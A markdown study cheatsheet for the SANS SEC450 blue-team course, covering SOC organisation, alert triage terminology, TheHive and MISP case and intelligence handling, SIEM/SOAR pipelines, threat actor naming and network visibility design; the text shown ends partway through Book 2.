---
title: "SANS SEC450: Blue Team Fundamentals — Master Study Cheatsheet"
date: "16-10-2026"
tags: ["sec450", "gsoc", "blue-team", "soc", "sans", "cheat-sheet"]
summary: "Comprehensive master study cheatsheet for SANS SEC450 (GSOC) across Books 1–5 covering SOC architecture, network defense, endpoint logging, alert triage, and security automation."
readTime: "90 min"
draft: false
---

![SANS SEC450 Cheat Sheet — Blue Team Fundamentals](/images/cheatSheets/sec450-cover.jpg)

| | |
|---|---|
| **Course** | SANS SEC450 — Blue Team Fundamentals: Security Operations and Analysis (GSOC) |
| **Author** | John Hubbard |
| **Edition** | 2022 SANS Institute |
| **Coverage** | 5 books, 38 modules, with a quick-reference appendix |

> Numbered, module-by-module notes with comparison tables, command references, and the diagrams and screenshots used in the course.

---

## Book 1 — Blue Team Tools and Operations

> **SEC 450.1 — Blue Team Tools and Operations**

### Module 1.1 — Welcome to the Blue Team & Foundation

#### 1. Course Introduction and Blue Team Reality

Security operations centers exist in a dynamic, high-stakes threat landscape:

- **Primary Goal:** Transform continuous security data streams into actionable defense and incident prevention.
- **The Core Asymmetry:** Attackers only need to find one flaw to succeed; defenders must protect all assets 24/7/365.
- **Loss Prevention Function:** The SOC does not generate direct revenue; it exists to preserve business value, brand reputation, customer trust, and regulatory standing.

![Verizon DBIR (2021): breach actor motives over time and breach actors by category](/images/cheatSheets/sec450/book1-p12-welcome-blue-team-1.png)

*Verizon DBIR (2021): breach actor motives over time and breach actors by category*

---

#### 2. Four Core Mission Questions

Security operations clarity begins with answering four fundamental questions (*Bollinger, Enright, Valites*):

1. **What are we trying to protect?** — Comprehensive asset inventory (hardware, software, data, identities, cloud workloads).
2. **What are the threats?** — Threat modeling, adversary intelligence, motivated threat actors, known CVEs.
3. **How do we detect them?** — Telemetry coverage, detection engineering, SIEM/EDR rule design, behavioral baselining.
4. **How will we respond?** — Incident response playbooks, containment procedures, forensics, post-incident root cause analysis.

---

#### 3. The SOC Charter & Steering Committee

Formal governance is critical to empower the security team:

- **The SOC Charter:** A foundational executive-approved document defining:
  - Authority to monitor, isolate systems, and enforce security policies
  - Scope of responsibility (on-premises, cloud, hybrid, OT/ICS, remote workforce)
  - Service Level Agreements (SLAs) for triage, containment, and notification
- **The Steering Committee:** Cross-functional leadership group (CISO, Legal, HR, IT Ops, Business Unit leaders):
  - Resolves policy conflicts between operational productivity and security lockdown
  - Approves changes to the organizational risk appetite and technology budget

---

#### 4. Organizational Risk Appetite

Security posture must calibrate to the organization's unique mission:

| Organization Type | Risk Appetite | Security Stance | Dominant Operational Focus |
|-------------------|---------------|-----------------|-----------------------------|
| **Defense / Military / Gov** | Ultra-Low | Maximum Lockdown | Strict zero trust, air gaps, rigorous compliance |
| **Financial / Healthcare** | Low | High Controls | Regulated data protection (PCI-DSS, HIPAA), EDR, 24/7 SOC |
| **Tech Startup / R&D** | High | Velocity-Driven | Developer freedom, automated guardrails, cloud-native visibility |

---

#### 5. Blue Team Truths

Fundamental operational realities every security analyst must internalize:

1. **Compromise Will Happen:** Perfect prevention is impossible. True security maturity is measured by *Mean Time to Detect (MTTD)* and *Mean Time to Respond (MTTR)*.
2. **Security Enables the Business:** Security is a loss-prevention function. If a defensive measure stops employees from generating revenue, the business will bypass it.
3. **Visibility Precedes Detection:** You cannot defend what you cannot see. Unmonitored network segments and unmanaged endpoints represent uncontrolled risk.

![Global median dwell time, 2011-2020: all compromises, external notification, and internal detection](/images/cheatSheets/sec450/book1-p13-welcome-blue-team-1.jpeg)

*Global median dwell time, 2011-2020: all compromises, external notification, and internal detection*

---

### Module 1.2 — SOC Architecture, Roles, and Systems

#### 1. Module Goals

This module covers:

1. The core components of security operations
2. Defining and understanding the SOC mission
3. Ensuring SOC alignment with organization objectives and risk appetite
4. Org charts for security operations
5. Security operations core functions
6. Useful reference documents for practitioners
7. Measuring and communicating SOC effectiveness

---

#### 2. The Components of Security Operations

The SOC rests on three foundational pillars:

- **People** — Performing analysis and investigation, designing and running processes
- **Process** — The defined sequence of events performed to achieve an end goal
- **Technology** — Hardware and software used to accomplish the mission

![The components of security operations: People, Process, and Technology](/images/cheatSheets/sec450/sec450-1-1-slide03-the-components-of-security-operations.png)

*The components of security operations: People, Process, and Technology*

---

#### 3. Understanding Your Mission — Four Core Questions

Cyber defense is difficult — where do we even start? These questions help clarify your mission and what success looks like:

1. What are we trying to protect?
2. What are the threats?
3. How do you detect them?
4. How will you respond?

---

#### 4. Finding the Organizational Risk Appetite

Remember to consider the big picture:

- Organizations don't exist to be secure — where is security on the priority list?
  - **Government/Military:** Highest importance
  - **New startup company:** Low importance
- Ask if your org has a "risk appetite statement"
- A mature security team understands the appetite and works within it
  - This doesn't mean you can't try to influence it
  - It will change as management, company, and priorities change

![Organizational risk appetite spectrum: no security, reasonable security, tight security](/images/cheatSheets/sec450/sec450-1-1-slide05-finding-the-organizational-risk.png)

*Organizational risk appetite spectrum: no security, reasonable security, tight security*

---

#### 5. Meeting the Risk Appetite

"What's the worst that could happen?"

- What type of work does your organization do?
- How critical is the success of the security team?
  - **Highly critical:** Application control, EDR/XDR, zero trust network design, strict email policies, etc.
  - **Less critical:** Basic tools and data monitoring capabilities
- **Goal:** Find ways to crank security as high as you can without hindering business process
  - Applying all appropriate "invisible security" options
  - Making smart choices when it comes to inconvenient/"visible" security

---

#### 6. Risk Appetite Meets Reality

Pretend you work for a vaccines company:

- A vendor-built PC runs a critical production line
- A locked-down, qualified build — no extra security software allowed
- Requires:
  - Outbound FTP data transfer
  - Inbound web status page
- Operating System is **Windows XP**
- How do you secure this machine?
  - *Hint: The answer is not "don't allow it to be used" — you'll quickly be shown the door with this approach*

---

#### 7. Accepting the Risk

The concept of risk acceptance gets joked about a lot in information security. However, remember that as badly as something may fail, sometimes the risk *must* be accepted — the important part is how you detect and respond to compromise when it occurs.

---

#### 8. Blue Team Truth #1 — Compromise Will Happen

The question is… how it will affect you?

- **Outcome 1:** Adversary succeeds in initial steps of the attack, but is quickly detected and fails to complete their mission
- **Outcome 2:** Adversary is not detected, runs free, causes a huge impact!
- Not all adversaries will be blocked from the get-go
- The acknowledgement of this fact and preparation for what occurs after is what separates a good from bad security operations team
- **Goal:** Detect and minimize damage from compromise

---

#### 9. Blue Team Truth #2 — The Company Doesn't Exist Solely to Be Secure

The team provides a "loss prevention" function:

- We reduce cybersecurity risk to an acceptable level
- Must strike balance between security and productivity
- No one can or wants to buy "perfect security" — it's prohibitively expensive
- Balance is defined by your organization/management
  - Can be frustrating, but doesn't mean we can't try to influence decisions
- Blue team must inform those who make the risk decisions
- Good information requires a deep understanding of your craft…

---

#### 10. How Are We Organized?

Typical SOC org chart:

SOC Lead → Incident Lead → Analysts (Tier 1, Tier 2/3-SMEs), Detection Engineering, Incident Response, Engineering & Infrastructure, Sys. Admin; plus SOC-adjacent functions (Threat Intel, Forensics, Vuln. Mgmt., Pen Testing/Red Team). Org structures vary and should be reconsidered as needs change.

![Typical SOC organization chart with SOC-adjacent functions](/images/cheatSheets/sec450/sec450-1-1-slide11-how-are-we-organized.png)

*Typical SOC organization chart with SOC-adjacent functions*

---

#### 11. Tiered SOCs

Many SOCs have tiered analyst roles:

- **Tier 1:** Learning the ropes
- **Tier 2:** Increasing capability
- **Tier 3:** Highly complex tasks

![Tiered SOC pyramid: Tier 1 triage and ticket generation, Tier 2 scoping and tactical remediation support, Tier 3 deep analysis and hunting](/images/cheatSheets/sec450/sec450-1-1-slide12-tiered-socs-fig2.png)

*Tiered SOC pyramid: Tier 1 triage and ticket generation, Tier 2 scoping and tactical remediation support, Tier 3 deep analysis and hunting*

---

#### 12. Tierless SOCs

Tierless vs. Tiered comparison:

**Tierless:**
- Everyone works together to get everything done
- Must carefully manage alerts
- Even new analysts can use all available data and tools
- Analysts more self-guided, teamwork crucial
- Stay engaged, learn quickly… but must know limits

**Tiered:**
- Senior and Lead titles for career progression
- Defined roles, clear path for promotion
- More structured processes, efficient handoffs and processing
- Often have less freedom to use all tools/data restrictions
- Slow progression, repetitiveness may lead to retention issues

---

#### 13. The SOC at a High Level

The SOC process flow:

1. **Collection**
2. **Detection**
3. **Triage**
4. **Investigation**
5. **Incident Response**

Many analysts' daily life is here — wrapped in a **continuous improvement** feedback loop driven by the outcome of investigations.

![The SOC at a high level: Collection, Detection, Triage, Investigation, and Incident Response wrapped in continuous improvement](/images/cheatSheets/sec450/sec450-1-1-slide14-the-soc-at-a-high.png)

*The SOC at a high level: Collection, Detection, Triage, Investigation, and Incident Response wrapped in continuous improvement*

---

#### 14. Deconstructing the SOC Process and Technology

To understand SOC functions, we simplify them:

- Abstract tools/functions into a simple "box" with inputs and outputs
- Deconstruction into inputs, outputs, and internal process shows how each item relates to each other

![Abstracting a SOC function into inputs, a process, and outputs](/images/cheatSheets/sec450/sec450-1-1-slide15-deconstructing-the-soc-process-and.png)

*Abstracting a SOC function into inputs, a process, and outputs*

---

#### 15. The SOC Abstracted

The SOC as a system:

- **Inputs:** What attacks look like (threat intel) and what happened (network traffic, endpoint events)
- **Outputs:** Identified, minimized, and remediated incidents

![The SOC abstracted: inputs (threat intelligence, network and endpoint events) and outputs (identified, minimized, remediated incidents)](/images/cheatSheets/sec450/sec450-1-1-slide16-the-soc-abstracted.png)

*The SOC abstracted: inputs (threat intelligence, network and endpoint events) and outputs (identified, minimized, remediated incidents)*

---

#### 16. SOC Process and Technology Functions

Organizing security team duties:

**Core SOC Activities:**
- **Data Collection:** What's happening on the network/devices
- **Detection:** Identifying items of interest from data collected
- **Triage and Investigation:** Confirming and prioritizing detected issues
- **Incident Response:** Responding to and minimizing the impact of attacks

**Specialty/Auxiliary Capabilities:**
- **Threat Intelligence:** Collecting information to improve attack detection
- **Forensics:** Supporting I.R. with deep research and reverse engineering
- **Self-Assessment:** Inventory, config monitoring, vuln. assessment, Red Team, etc.

---

#### 17. Inside the SOC System

Detailed SOC component flow:

Signatures + Events → **Detection** → **Triage/Investigation** → **Incident Response** → Remediated Issues

Supported by Threat Intel, Forensics, and Red Team/Pen Testing inputs.

![Inside the SOC system: signatures and events feeding detection, triage, and incident response](/images/cheatSheets/sec450/sec450-1-1-slide18-inside-the-soc-system.png)

*Inside the SOC system: signatures and events feeding detection, triage, and incident response*

---

#### 18. Critical SOC Information

Analysts should have access to:

- **Network diagram:** Simplified version for easy reference
- **Points of visibility:** Taps and span ports, full PCAP
- **Data flow diagram:** How does traffic reach the internet?
- **Log flow diagram:** Where do logs come from/go?
- **Incident response plan:** What to do when things go wrong
- **Communication plan:** Who to inform, and when
- **List of critical assets and points of contact**
- **Disaster recovery/business continuity plans**
- Any other relevant policies, standards, procedures, guidelines

---

#### 19. Documents Analysts Must Be Familiar With

Governance hierarchy from broadest/mandatory to most specific:

- **Policies:** High level, broad, direction setting, mandatory
  - *"All systems plugged into the network must have antivirus installed"*
- **Standards:** Also mandatory, define how or how much
  - *"Configuration settings for antivirus agents must be…"*
- **Procedures:** Step-by-step instructions for a process
  - *"How to install and ensure antivirus is working"*
- **Guidelines:** Discretionary, suggested actions/recommended procedures
  - *"Best practices for antivirus deployment"*
- **Baselines:** Highly specific settings list (e.g., CIS benchmarks)
- **Use Case/Playbook:** SOC-specific prescriptive rules/procedures for detection

![Documents analysts must be familiar with: policies, standards, procedures, guidelines, and baselines](/images/cheatSheets/sec450/sec450-1-1-slide20-documents-analysts-must-be-familiar.png)

*Documents analysts must be familiar with: policies, standards, procedures, guidelines, and baselines*

---

#### 20. Measuring and Communicating SOC Effectiveness

You will be judged based on the metrics you produce:

- **Good metrics:** Measurable, actionable, and tied to business outcomes
- Metrics drive improvement and communicate the SOC's value to leadership
- Track: mean time to detect (MTTD), mean time to respond (MTTR), alert volume, false positive rates, and incident categorization trends

---

#### 21. SOC Overview Summary

Summary:

- **Your mission:** Identify and reduce breaches
- The charter gives you the power to do so
- The steering committee guides you and helps drive which controls are deployed
- The SOC is a complex set of systems: People, Technology, Processes with inputs and outputs
  - Collection, Detection, Triage, Investigation, IR, Threat Intel, Self-Assessment, and Forensics
- Org charts vary for SOCs — there is no "best" setup
- Critical info must be gathered, monitored, and understood

---

### Module 1.3 — Defensible Network Concepts

#### 1. Bejtlich's 8 Pillars of a Defensible Network

A network cannot be defended unless it is engineered with defensibility in mind:

| Pillar | Operational Definition | Blue Team Practical Application |
|--------|------------------------|----------------------------------|
| **Monitored** | Traffic and endpoint activity are continuously inspected | Full packet capture, flow logs, EDR agents, SIEM ingestion |
| **Inventoried** | Definitive accounting of all connected hardware and software | Asset discovery scans, CMDB synchronization, DHCP lease logs |
| **Controlled** | Strict boundaries and communication constraints enforced | Microsegmentation, firewall rules, zero-trust network access |
| **Claimed** | Explicit system ownership assigned across all devices | Clear points of contact (POCs) for rapid incident escalation |
| **Minimized** | Attack surface ruthlessly reduced | Disabled unnecessary services, closed ports, removed default accounts |
| **Assessed** | Continuous vulnerability and configuration audits | Automated Nessus/Qualys scanning, configuration drift checks |
| **Current** | Aggressive, prioritized patching lifecycle | Vulnerability remediation SLAs based on CVSS and active exploits |
| **Measured** | Quantitative tracking of security posture and team efficacy | MTTD, MTTR, patch compliance %, coverage gap metrics |

---

#### 2. Monitoring Dichotomy: NSM vs CSM

Modern defensive posture requires a dual-lens architecture:

- **Network Security Monitoring (NSM):**
  - **Focus:** Data in motion.
  - **Sources:** Passive network taps, SPAN ports, firewall logs, Zeek protocol logs, NetFlow/IPFIX, Suricata alerts.
  - **Strengths:** Cannot be tampered with by an attacker on a compromised endpoint; catches unmanaged/rogue devices (IoT, BYOD).
  - **Weaknesses:** Blind to encrypted payloads (TLS 1.3); ephemeral connections may escape flow timers.
- **Continuous Security Monitoring (CSM):**
  - **Focus:** Data at rest, execution states, host memory, and process trees.
  - **Sources:** EDR telemetry, Windows Security Event Logs, Sysmon, Linux auditd, authentication servers.
  - **Strengths:** Full process context, command-line arguments, parent-child relationships, injected code detection.
  - **Weaknesses:** Can be blinded if rootkit or kernel exploit bypasses/disables the EDR agent.

---

#### 3. Sensor Placement and Visibility Choke Points

Strategic positioning of network sensors dictates analytical clarity:

- **Perimeter / Internet Boundary:** Placed outside and inside firewalls to inspect ingress and egress traffic; reveals external scans vs accepted connections.
- **Internal Choke Points (Core Switch / Inter-VLAN):** Captures East-West traffic, internal lateral movement (SMB, RPC, RDP), and internal reconnaissance.
- **DMZ Inspection:** Monitors public-facing web servers and mail gateways to detect exploitation attempts and web shells before internal pivoting occurs.
- **TAPs vs SPANs:** Hardware TAPs are fail-safe and capture full line-rate traffic without packet loss; switch SPAN ports drop packets under heavy network loads.

---

### Module 1.4 — Events, Alerts, Anomalies, and Incidents

#### 1. Core Terminology and Classifications (NIST SP 800-61)

Precise terminology prevents operational confusion during crisis handling:

- **Event:** Any observable occurrence in a system or network (e.g., user logon, DNS query, HTTP GET request, firewall permit). Events occur in billions daily.
- **Alert:** A notification generated by a detection rule indicating that a specific event or sequence of events matches pre-configured suspicious criteria.
- **Anomaly:** An observable deviation from an established historical baseline or normal operational pattern (e.g., unexpected data burst at 3 AM).
- **Incident:** An assessed event or series of events that actually or potentially jeopardizes the confidentiality, integrity, or availability of an information system.

---

#### 2. The Alert Triad & Evaluation Matrix

Every alert falls into one of four statistical quadrants:

| Detection State | Attacker Present (True Condition) | No Attacker (Normal Activity) | SOC Operational Action |
|-----------------|-----------------------------------|-------------------------------|------------------------|
| **Alert Fired (Positive)** | **True Positive (TP)** — Desired! Malicious activity detected. | **False Positive (FP)** — Noise! Benign activity flagged as evil. | TPs escalate to investigation; FPs require tuning to reduce fatigue. |
| **No Alert (Negative)** | **False Negative (FN)** — Catastrophic! Adversary evaded detection. | **True Negative (TN)** — Normal! Benign traffic correctly ignored. | FNs indicate detection gaps; require threat hunting and new analytics. |

```
Precision = TP / (TP + FP)  --> High precision means few false alarms
Recall    = TP / (TP + FN)  --> High recall means few missed attacks
```

![True positive, false positive, and anomaly-based alert regions across events](/images/cheatSheets/sec450/book1-p83-events-alerts-anomalies-1.png)

*True positive, false positive, and anomaly-based alert regions across events*

---

#### 3. Combating Alert Fatigue

Alert fatigue is the primary operational failure mode in modern SOCs:

- **Root Causes:** Poorly tuned generic signatures, unprioritized alert queues, duplicate alerts across multiple tools.
- **The Human Cost:** Analysts become desensitized, glance over alerts, and miss critical true positive indicators hidden within mountains of noise.
- **Engineering Solutions:**
  - Mandatory rule lifecycle (drafting -> testing -> staging -> production -> deprecation)
  - Aggregation and deduplication rules in SIEM/SOAR
  - Dynamic severity scoring based on target asset criticality

![Suricata alert summary ranked by alert count with rule names and IDs](/images/cheatSheets/sec450/book1-p78-events-alerts-anomalies-1.jpeg)

*Suricata alert summary ranked by alert count with rule names and IDs*

---

### Module 1.5 — Incident Management Systems (IMS) & TheHive

#### 1. Why Dedicated Incident Management Systems Are Mandatory

Spreadsheets, emails, and generic ticketing systems (Jira/ServiceNow) fail during security investigations:

- **Lack of Atomic Observables:** Generic ticket systems cannot isolate, correlate, and track specific IOCs across multiple independent cases.
- **Chain of Custody Failure:** Incident response requires tamper-evident audit logs of every analyst note, artifact addition, and timeline edit.
- **Collaboration Breakdown:** Multiple analysts investigating different hosts during a major breach need real-time shared workspace and task synchronization.

---

#### 2. TheHive Case Management Architecture

TheHive is an open-source, purpose-built Security Incident Response Platform (SIRP):

- **Case Hierarchy:**
  - **Alerts:** Ingested from SIEM, EDR, email, or user reports. Can be merged into existing cases or escalated to new cases.
  - **Cases:** Container for the full investigation, containing title, severity, TLP, description, tasks, and observables.
  - **Tasks:** Atomic work items assigned to specific analysts (e.g., "Memory dump analysis", "Firewall log review").
  - **Observables:** Specific technical artifacts (IPs, domains, hashes, URLs, filenames) tagged with IOC flags and Sighting statuses.

![Alert-to-incident workflow: alert generated, high-fidelity decision, and creation of a new incident ticket](/images/cheatSheets/sec450/book1-p86-incident-management-1.png)

*Alert-to-incident workflow: alert generated, high-fidelity decision, and creation of a new incident ticket*

![Alert-to-incident workflow, continued: enrichment, correlation, and further analysis leading to an 'Evil?' decision](/images/cheatSheets/sec450/book1-p86-incident-management-2.png)

*Alert-to-incident workflow, continued: enrichment, correlation, and further analysis leading to an 'Evil?' decision*

![TheHive task list organized by kill chain phase with assigned analysts](/images/cheatSheets/sec450/book1-p104-incident-management-1.png)

*TheHive task list organized by kill chain phase with assigned analysts*

![TheHive form for creating new observables (type, values, TLP, tags, description)](/images/cheatSheets/sec450/book1-p105-incident-management-2.png)

*TheHive form for creating new observables (type, values, TLP, tags, description)*

![TheHive observable list showing domain observables with tags](/images/cheatSheets/sec450/book1-p105-incident-management-1.png)

*TheHive observable list showing domain observables with tags*

![TheHive observable data types (domain, file, filename, fqdn, hash, ip, mail, regexp, url, user-agent, and others)](/images/cheatSheets/sec450/book1-p105-incident-management-3.jpeg)

*TheHive observable data types (domain, file, filename, fqdn, hash, ip, mail, regexp, url, user-agent, and others)*

![Closing a TheHive case: status, impact, and summary](/images/cheatSheets/sec450/book1-p106-exercise-thehive-1.jpeg)

*Closing a TheHive case: status, impact, and summary*

![TheHive case metadata: VERIS delivery category, incident detection, system impact, and type of system affected](/images/cheatSheets/sec450/book1-p106-exercise-thehive-2.png)

*TheHive case metadata: VERIS delivery category, incident detection, system impact, and type of system affected*

---

#### 3. Cortex & Automated Analysis Integration

TheHive pairs with **Cortex** to automate observable enrichment and containment:

- **Analyzers:** Automated scripts that query external and internal services for observable reputation (e.g., VirusTotal, Shodan, MISP, PassiveTotal, DomainTools).
- **Responders:** Automated scripts that trigger defensive actions directly from the case interface (e.g., block IP on Palo Alto firewall, isolate host in CrowdStrike, disable user in AD).

---

### Module 1.6 — Threat Intelligence Platforms (TIP) & MISP

#### 1. Cyber Threat Intelligence (CTI) Fundamentals

Threat intelligence is evidence-based knowledge about threats that informs security decisions:

- **Strategic CTI:** High-level trends, adversary motivations, and geopolitical risk for executive decision-makers (CISOs, board).
- **Operational CTI:** Adversary tactics, techniques, and procedures (TTPs) mapping to the MITRE ATT&CK framework; used by SOC leads and architects.
- **Tactical / Technical CTI:** Specific indicators of compromise (IOCs) such as malicious file hashes, C2 IP addresses, phishing domains; consumed directly by SIEM, firewalls, and EDR.

---

#### 2. Good vs Bad Threat Intelligence

Not all threat data is useful; poor CTI degrades SOC efficiency:

- **Bad CTI:** Massive feeds of unvetted, expired IP addresses (e.g., dynamic residential IPs or Cloudflare reverse proxies) that generate flood of false positives.
- **Good CTI:** Relevant, vetted, contextualized intelligence that includes confidence scores, first/last seen timestamps, associated campaign tags, and recommended detection logic.
- **Traffic Light Protocol (TLP):**
  - **TLP:RED:** Non-shareable; restricted strictly to participants in the meeting/room.
  - **TLP:AMBER:** Limited disclosure; restricted to the recipient organization and its clients on a need-to-know basis.
  - **TLP:GREEN:** Community disclosure; shareable across the security industry and partner organizations.
  - **TLP:WHITE / CLEAR:** Public disclosure; unlimited distribution permitted.

---

#### 3. MISP (Malware Information Sharing Platform)

MISP provides a structured, collaborative platform for storing and sharing technical CTI:

- **Events:** Contextual containers describing a specific malware campaign, threat group activity, or incident.
- **Attributes:** Individual indicators (hashes, IPs, registry keys) linked to an Event, enriched with IDS flags and distribution levels.
- **Taxonomies & Galaxies:** Standardized tagging systems (e.g., MITRE ATT&CK techniques, Diamond model phases, ENISA threat types).
- **De-fanged Indicators:** Safe formatting to prevent accidental clicking:
  - `http://evil[.]com/malware` -> `hxxp[://]evil[.]com/malware`
  - `192.168.1.100` -> `192[.]168[.]1[.]100`

![MISP Add Event form: date, distribution, threat level, analysis, and event info](/images/cheatSheets/sec450/book1-p129-threat-intel-platforms-1.png)

*MISP Add Event form: date, distribution, threat level, analysis, and event info*

![MISP freetext import tool for bulk-loading indicators](/images/cheatSheets/sec450/book1-p130-threat-intel-platforms-3.png)

*MISP freetext import tool for bulk-loading indicators*

![MISP event detail view with tags, threat level, analysis, and distribution](/images/cheatSheets/sec450/book1-p131-threat-intel-platforms-1.png)

*MISP event detail view with tags, threat level, analysis, and distribution*

![MISP correlation graph linking related events and shared attributes](/images/cheatSheets/sec450/book1-p131-threat-intel-platforms-2.jpeg)

*MISP correlation graph linking related events and shared attributes*

![MISP event list with taxonomy and galaxy tags](/images/cheatSheets/sec450/book1-p132-exercise-misp-1.jpeg)

*MISP event list with taxonomy and galaxy tags*

---

### Module 1.7 — SIEM, Security Automation, and Elastic Stack

#### 1. SIEM Core Architecture and Pipeline

The Security Information and Event Management (SIEM) system is the central nervous system of the SOC:

```
[Endpoints & Servers]  --> [Log Forwarders (Beats)] --> [Logstash Parsing/ECS] --> [Elasticsearch Cluster] --> [Kibana UI / Alerts]
[Network TAPs & Zeek]  --> [Syslog Collectors]      --> [Enrichment (Geo/CMDB)] --> [Indexed JSON Documents]--> [SOC Analysts]
```

- **Ingestion:** Collecting diverse log streams via Syslog, API, WinRM, and specialized host agents.
- **Parsing and Normalization:** Extracting unstructured log strings into standardized key-value schemas (e.g., Elastic Common Schema - ECS).
- **Enrichment:** Decorating events with contextual metadata (GeoIP, ASN, internal asset owner, threat intel tags) at ingestion time.
- **Indexing & Storage:** Storing parsed records in distributed databases optimized for lightning-fast full-text and field queries.
- **Correlation & Detection:** Running scheduled or streaming search queries that evaluate rules across disparate data sources.

---

#### 2. Elastic Stack (ELK / Elastic Security) in the SOC

The Elastic Stack serves as the premier open-architecture SIEM platform:

- **Elasticsearch:** Distributed JSON document search and analytics engine. Sharded, clustered, and horizontally scalable.
- **Kibana:** Visual analytics dashboard, management console, and detection engine interface.
- **Logstash:** Server-side data processing pipeline that ingests from multiple sources simultaneously, transforms, and ships to Elasticsearch.
- **Beats:** Lightweight, single-purpose data shippers installed directly on endpoints:
  - `Winlogbeat:` Windows Event Log collector supporting Sysmon and Security event forwarding.
  - `Filebeat:` High-performance log file collector with built-in modules for Zeek, Suricata, Apache, Nginx, System logs.
  - `Packetbeat:` Network packet analyzer providing real-time protocol decoding.

![Kibana Discover view: event histogram over time above individual log documents](/images/cheatSheets/sec450/book1-p146-siem-automation-1.png)

*Kibana Discover view: event histogram over time above individual log documents*

---

#### 3. Security Orchestration, Automation, and Response (SOAR)

SOAR technology connects disparate security tools through automated workflows:

- **Automated Triage:** Fetching VirusTotal scores, checking user location history, and querying Active Directory when an alert triggers.
- **Playbook Execution:** Pre-programmed decision trees that execute containment steps when high-confidence alert conditions are met.
- **Human-in-the-Loop Philosophy:** High-impact actions (e.g., disabling a domain controller or terminating a C-suite user account) must require explicit analyst approval via interactive prompt.

![Example email-triage playbook: extract URLs, IPs, and files, check spoofing and sender reputation, then alert the SOC or prepare inbox removal](/images/cheatSheets/sec450/book1-p150-siem-automation-1.png)

*Example email-triage playbook: extract URLs, IPs, and files, check spoofing and sender reputation, then alert the SOC or prepare inbox removal*

---

### Module 1.8 — Know Your Enemy & Attack Frameworks

#### 1. Threat Actor Categorization

Understanding adversary motivations dictates appropriate defensive posture:

| Threat Actor Class | Primary Motivation | Capability Level | Target Selection | Common TTPs |
|--------------------|--------------------|------------------|------------------|-------------|
| **Script Kiddies** | Notoriety, curiosity | Low (Off-the-shelf) | Opportunistic / Random | Automated mass scanning, public exploits |
| **Hacktivists** | Ideology, political statements | Low to Moderate | High-profile targets | DDoS, website defacement, doxxing |
| **Cybercriminals (eCrime)** | Financial gain | Moderate to High | High-value corporations | Ransomware, BEC, banking trojans, extortion |
| **Nation-State (APTs)** | Espionage, sabotage, IP theft | Extremely High | Strategic government / critical infra | Custom zero-days, living-off-the-land, deep stealth |
| **Malicious Insiders** | Revenge, greed, coercion | Varies (High access) | Internal specific systems | Legitimate credentials, bulk data exfiltration |

---

#### 2. Targeted vs Opportunistic Attacks

Defenders must recognize the nature of the incoming threat campaign:

- **Opportunistic Attacks:** Broadcast sprays scanning wide IP ranges for unpatched vulnerabilities (e.g., Log4j, Exchange ProxyLogon). The adversary does not care *who* you are—only that you are vulnerable.
- **Targeted Attacks:** Adversaries conduct extensive reconnaissance specifically against your organization, spear-phish high-value employees, craft custom malware payloads, and persist indefinitely until their objective is met.

---

#### 3. Industry Naming Conventions

Different vendors assign proprietary codenames to the same adversary groups:

| Adversary Group | CrowdStrike | Microsoft | Mandiant | Nation Origin |
|-----------------|-------------|-----------|----------|---------------|
| **APT28 / Fancy Bear** | Fancy Bear | Strontium / Forest Blizzard | APT28 | Russia (GRU) |
| **APT29 / Cozy Bear** | Cozy Bear | Nobelium / Midnight Blizzard | APT29 | Russia (SVR) |
| **APT41 / Barium** | Wicked Panda | Brass Typhoon | APT41 | China (MSS) |
| **Lazarus Group** | Stardust Chollima | Zinc / Diamond Sleet | APT38 | North Korea (RGB) |
| **APT33 / Elfin** | Refined Kitten | Holmium / Peach Sandstorm | APT33 | Iran (IRGC) |

---

## Book 2 — Understanding Your Network

> **SEC 450.2 — Understanding Your Network**

### Module 2.1 — Network Architecture and Defense

#### 1. Network Segmentation and Defensive Zones

Modern enterprise networks must partition risk through structured network zoning:

- **Untrusted / External Zone:** The open Internet; origin of direct external probes, brute force attacks, and web scanners.
- **Demilitarized Zone (DMZ):** Isolated network buffer hosting public-facing services (HTTP, HTTPS, SMTP, DNS, VPN endpoints). Dual-homed firewalls strictly govern inbound traffic from the Internet and outbound traffic into the intranet.
- **Corporate Intranet / End-User LAN:** Workstations, laptops, printers, VoIP phones. Primary entry point for phishing, drive-by downloads, and user credential theft.
- **Server Farm / Data Center:** Mission-critical internal infrastructure (Active Directory Domain Controllers, file servers, internal databases). Direct internet access strictly blocked.
- **Management / Out-of-Band (OOB) Zone:** Highly restricted segment dedicated to hypervisor consoles, network switch management, IPMI/iLO/iDRAC interfaces, and backup controllers.

---

#### 2. Network Visibility Infrastructure: TAPs vs SPANs

Acquiring pristine, unmodified network telemetry is the foundation of network security analysis:

| Visibility Appliance | Operational Principle | Advantages | Critical Limitations |
|----------------------|-----------------------|------------|----------------------|
| **Passive Hardware TAP** | Physical hardware device spliced directly into the cable (copper or fiber). | 100% full-line rate capture; zero dropped packets; fail-safe (relay closes on power loss); completely invisible to attackers (no IP/MAC). | Requires physical cable interruption to install; capital expense per link. |
| **Switch SPAN / Mirror Port** | Switch configuration that copies packets from designated source ports/VLANs to a destination monitor port. | Inexpensive; software-configured without physical disruption; flexible remote reconfiguration. | **Drops packets under heavy switch load**; buffers alter precise packet timing; can alter/strip malformed packets or Layer 2 frames. |

---

#### 3. Zero Trust Architecture (ZTA) Principles

Traditional perimeter defense assumes inside traffic is trustworthy; Zero Trust eliminates implicit trust:

- **Core Mantra:** *"Never Trust, Always Verify; Assume Breach."*
- **Explicit Verification:** Every access request is dynamically authenticated and authorized based on user identity, device posture, location, and data sensitivity before access is granted.
- **Microsegmentation:** Workloads and application tiers are isolated down to individual host-to-host boundaries, restricting an attacker from pivoting laterally upon initial compromise.
- **Least Privilege Access:** Users and service accounts receive the absolute minimum permissions and session durations required to complete business tasks.

---

### Module 2.2 — Traffic Capture and Network Analysis

#### 1. The Three Tiers of Network Telemetry

Network defenders balance storage costs and analytical depth across three data tiers:

| Telemetry Tier | Data Content | Primary Tools | Storage Retention | Best Use Case |
|----------------|--------------|---------------|-------------------|---------------|
| **Full Packet Capture (PCAP)** | Complete Layer 2–Layer 7 raw bytes (headers + full payloads). | Wireshark, tcpdump, netsniff-ng, Arkime | Days (High storage footprint) | Deep packet carving, payload extraction, malware reassembly, SSL/TLS decryption (with keys). |
| **Transaction / Protocol Logs** | Structured metadata extracted from application layer protocols. | **Zeek (Bro)**, Suricata EVE.json | Weeks to Months | Forensic pivoting, connection tracking, certificate auditing, file hashing from wire. |
| **Flow Telemetry** | Statistical summary of IP conversations (5-tuple, byte/packet counts, flags). | NetFlow v5/v9, IPFIX, sFlow | Months to Years | Bandwidth accounting, top talkers, volumetric DDoS, beaconing frequency analysis. |

